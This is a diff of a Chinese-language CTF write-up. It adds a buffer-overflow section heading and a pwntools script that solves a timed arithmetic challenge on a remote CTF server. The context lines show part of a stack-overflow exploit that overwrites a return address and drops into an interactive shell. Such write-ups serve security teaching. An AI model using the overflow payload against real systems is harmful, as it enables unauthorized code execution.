@@ -26,6 +26,7 @@ pdf裡面藏白色文字 全選起來用editor解答
 
 ## Pwn
 
+### 0x01 (BOF)
 
 有一點久沒寫exploits生疏了 這題順便紀錄一下
 
@@ -50,6 +51,45 @@ playload = "A"*56 + p64(0x004006b6)
 r.send(playload)
 
 r.interactive()
+
+```
+
+
+### 0x02 (math)
+
+要在60秒內解完100題數學題 簡單的考你會不會寫程式跟使用pwntools而已
+
+```python
+
+from pwn import *
+r = remote('140.110.112.29',5119)
+r.recvline() #Can you help us?
+r.recvline()
+
+
+print(r.recvline())
+
+for i in range(100):
+	print(r.recvline())
+
+	s = r.recvline()
+
+	one = s.split('?')
+	print(one)
+	two = one[1].split('=')
+	print(two)
+
+	if(int(one[0]) + int(two[0]) == int(two[1])):
+		print('+')
+		r.sendline('+')
+	elif(int(one[0]) - int(two[0]) == int(two[1])):
+		print('-')
+		r.sendline('-')
+	elif(int(one[0]) * int(two[0]) == int(two[1])):
+		print('*')
+		r.sendline('*')
+
+print(r.recvline())
 
 ```
 
